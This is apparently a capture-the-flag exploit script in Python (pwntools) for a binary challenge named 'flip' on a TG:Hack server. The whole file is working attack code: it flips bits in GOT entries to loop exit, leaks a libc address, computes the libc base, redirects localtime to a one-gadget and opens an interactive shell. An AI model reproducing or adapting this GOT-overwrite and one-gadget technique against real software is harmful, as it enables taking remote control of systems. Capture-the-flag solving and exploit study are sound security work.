#!/usr/bin/python
from pwn import *
import sys

HOST = "flip.tghack.no"
PORT = 1947

def flip(address, bit):
    r.sendlineafter("flip: ", "%s:%d" % (hex(address), bit))

def exploit(r):
    log.info("Goto infinite loop")

    flip(e.got["exit"], 1)
    flip(e.got["exit"], 2)
    flip(e.got["exit"], 4)
    flip(0x601500, 1)               # junk
    flip(0x601500, 1)               # junk
    r.recvuntil("that's it!")

    log.info("Overwrite welcome string for leak")
    flip(0x601082, 5)
    flip(0x601081, 0)
    flip(0x601081, 1)
    flip(0x601081, 3)
    flip(0x601081, 4)
    r.recvuntil("that's it!")

    flip(0x601080, 0)
    flip(0x601080, 4)
    flip(0x601080, 5)
    flip(0x601500, 1)   # junk
    flip(0x601500, 1)   # junk    
    r.recvuntil(":)\n")

    SETVBUF = u64(r.recv(6).ljust(8, "\x00"))
    libc.address = SETVBUF - libc.symbols["setvbuf"]

    log.info("SETVBUF    : %s" % hex(SETVBUF))
    log.info("LIBC       : %s" % hex(libc.address))

    log.info("Flip exit to main")
    flip(0x601068, 4)
    flip(0x601068, 5)
    flip(0x601069, 1)
    flip(0x601069, 2)
    flip(0x601069, 3)

    log.info("Overwrite time with one gadget")

    ONE = libc.address + 0x10a38c
    SOURCE = libc.symbols["localtime"]  

    log.info("ONE        : %s" % hex(ONE))

    ONEBIN = bin(ONE)[::-1]
    SOURCEBIN = bin(SOURCE)[::-1]

    CUROFF = 0x601018

    for i in range(len(ONEBIN)):
        if ONEBIN[i] != SOURCEBIN[i]:
            flip(CUROFF + (i/8), i%8)

    flip(0x601500, 1)  # junk

    log.info("Flip exit to start to trigger onegadget")
    flip(0x601068, 4)
    flip(0x601068, 5)
    flip(0x601069, 1)
    flip(0x601069, 2)
    flip(0x601069, 3)

    r.interactive()
    
    return

if __name__ == "__main__":
    e = ELF("./flip")
    libc = ELF("./libc.so.6")

    if len(sys.argv) > 1:
        r = remote(HOST, PORT)
        exploit(r)
    else:
        r = process("./flip", env={"LD_PRELOAD":"./libc.so.6"})
        print util.proc.pidof(r)
        pause()
        exploit(r)
